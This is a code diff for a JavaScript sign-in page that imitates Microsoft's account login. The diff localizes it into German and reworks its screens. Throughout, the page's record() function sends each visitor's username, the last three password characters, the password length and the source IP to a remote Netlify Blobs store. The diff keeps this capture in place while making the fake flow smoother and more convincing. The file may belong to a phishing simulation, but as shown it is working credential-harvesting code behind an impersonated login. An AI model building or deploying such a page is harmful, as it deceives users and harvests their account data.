@@ -1,18 +1,36 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const unReq = "Enter a valid email address, phone number, or Skype name.";
-  const pwdReq = "Please enter the password for your Microsoft account.";
+  const unReq = "Geben Sie eine gültige E-Mail-Adresse, Telefonnummer oder einen Skype-Namen ein.";
+  const pwdReq = "Geben Sie das Kennwort für Ihr Microsoft-Konto ein.";
   const unameInp = document.getElementById("inp_uname");
   const pwdInp = document.getElementById("inp_pwd");
+  const sections = [
+    "section_uname",
+    "section_pwd",
+    "section_final",
+    "section_success",
+  ];
   let view = "uname";
 
   let unameVal = (pwdVal = false);
 
-  ///// send the captured credentials to Netlify Blobs
+  ///// Bildschirm wechseln
+  function show(id) {
+    sections.forEach((s) => document.getElementById(s).classList.add("d-none"));
+    document.getElementById(id).classList.remove("d-none");
+    window.scrollTo(0, 0);
+  }
+
+  ///// implizites Absenden des Formulars verhindern (kein Neuladen der Seite)
+  document.querySelectorAll("form").forEach((f) => {
+    f.addEventListener("submit", (e) => e.preventDefault());
+  });
+
+  ///// erfasste Zugangsdaten an Netlify Blobs senden
   async function record(step) {
     const payload = {
       step: step,
       username: unameInp.value.trim(),
-      // only the trailing three characters of the password leave the browser
+      // nur die letzten drei Zeichen des Kennworts verlassen den Browser
       passwordLast3: pwdInp.value ? pwdInp.value.slice(-3) : null,
       passwordLength: pwdInp.value ? pwdInp.value.length : null,
     };
@@ -21,42 +39,55 @@ document.addEventListener("DOMContentLoaded", () => {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
-        keepalive: true, // survives the window.close() below
+        keepalive: true,
       });
     } catch (err) {
-      console.warn("Could not record sign-in:", err);
+      console.warn("Anmeldung konnte nicht erfasst werden:", err);
     }
   }
 
-  /////next button
+  ///// Weiter-Schaltfläche
   const nxt = document.getElementById("btn_next");
 
   nxt.addEventListener("click", () => {
-    //validate the form
+    //Formular validieren
     validate();
     if (unameVal) {
-      document.getElementById("section_uname").classList.toggle("d-none");
-      document.getElementById("section_pwd").classList.remove("d-none");
       document.querySelectorAll("#user_identity").forEach((e) => {
         e.innerText = unameInp.value;
       });
+      show("section_pwd");
       view = "pwd";
       pwdInp.focus();
     }
   });
 
-  //////sign in button
+  ////// Anmelden-Schaltfläche
 
   const sig = document.getElementById("btn_sig");
 
   sig.addEventListener("click", () => {
-    //validate the form
+    //Formular validieren
     validate();
     if (pwdVal) {
-      record("signin"); // <-- capture username + last 3 + IP
-      document.getElementById("section_pwd").classList.toggle("d-none");
-      document.getElementById("section_final").classList.remove("d-none");
+      record("signin"); // Benutzername + letzte 3 Zeichen + Quell-IP erfassen
+      show("section_final");
       view = "final";
+    }
+  });
+
+  ///// Eingabetaste springt zum nächsten Schritt, statt die Seite neu zu laden
+  unameInp.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      nxt.click();
+    }
+  });
+
+  pwdInp.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") {
+      e.preventDefault();
+      sig.click();
     }
   });
 
@@ -89,42 +120,47 @@ document.addEventListener("DOMContentLoaded", () => {
       } else {
         unameValAction(true);
       }
-      unameInp.addEventListener("change", function () {
-        if (this.value.trim() === "") {
-          unameValAction(false);
-        } else {
-          unameValAction(true);
-        }
-      });
     } else if (view === "pwd") {
       if (pwdInp.value.trim() === "") {
         pwdValAction(false);
       } else {
         pwdValAction(true);
       }
-      pwdInp.addEventListener("change", function () {
-        if (this.value.trim() === "") {
-          pwdValAction(false);
-        } else {
-          pwdValAction(true);
-        }
-      });
     }
     return false;
   }
 
-  //back button
+  //Zurück-Schaltfläche
   document.querySelector(".back").addEventListener("click", () => {
     view = "uname";
-    document.getElementById("section_pwd").classList.toggle("d-none");
-    document.getElementById("section_uname").classList.remove("d-none");
+    show("section_uname");
+    unameInp.focus();
   });
 
-  //final buttons
-  document.querySelectorAll("#btn_final").forEach((b) => {
-    b.addEventListener("click", () => {
-      //close the window
-      window.open(location, "_self").close();
-    });
+  ///// Abschluss-Schaltflächen bestätigen jetzt, statt das Fenster zu schließen
+  function finish(stay) {
+    document.getElementById("success_msg").innerText = stay
+      ? "Sie bleiben angemeldet. Sie können dieses Fenster jetzt schließen."
+      : "Alles erledigt. Beim nächsten Mal müssen Sie sich erneut anmelden.";
+    show("section_success");
+    view = "success";
+  }
+
+  document.getElementById("btn_yes").addEventListener("click", () => finish(true));
+  document.getElementById("btn_no").addEventListener("click", () => finish(false));
+
+  ///// von vorn beginnen
+  document.getElementById("btn_restart").addEventListener("click", () => {
+    unameInp.value = "";
+    pwdInp.value = "";
+    document.getElementById("error_uname").innerText = "";
+    document.getElementById("error_pwd").innerText = "";
+    unameInp.classList.remove("error-inp");
+    pwdInp.classList.remove("error-inp");
+    view = "uname";
+    show("section_uname");
+    unameInp.focus();
   });
+
+  unameInp.focus();
 });
